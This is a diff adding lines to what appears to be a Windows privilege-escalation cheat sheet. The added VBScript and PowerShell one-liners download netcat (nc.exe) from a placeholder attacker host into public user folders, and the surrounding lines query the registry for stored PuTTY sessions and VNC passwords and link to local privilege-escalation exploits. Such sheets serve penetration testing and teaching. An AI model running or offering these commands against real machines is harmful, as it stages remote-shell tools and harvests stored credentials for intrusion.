@@ -245,6 +245,28 @@ Folder permissions - `accesschk.exe -dqv <path>`
 `reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"`
 `reg query "HKCU\Software\ORL\WinVNC3\Password"`
 
+* Download file with VBS
+```
+dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", "http://yourIp/nc.exe", False
+xHttp.Send
+
+with bStrm
+    .type = 1 \'//binary
+    .open
+    .write xHttp.responseBody
+    .savetofile "C:\\Users\\Public\\nc.exe", 2 \'//overwrite
+end with
+```
+
+* Download with Powershell 3+
+`powershell -NoLogo -Command "Invoke-WebRequest -Uri 'https://yourIP/nc.exe' -OutFile 'c:\Users\Public\Downloads\nc.exe'"`
+
+* Download with Powershell 2
+`powershell -NoLogo -Command "$webClient = new-object System.Net.WebClient; $webClient.DownloadFile('https://yourIP/nc.exe', 'c:\Users\Public\Download\nc.exe')"`
+
+
 * Windows specific LPE vulns
 - https://www.exploit-db.com/exploits/11199/
 - https://www.exploit-db.com/exploits/18176/
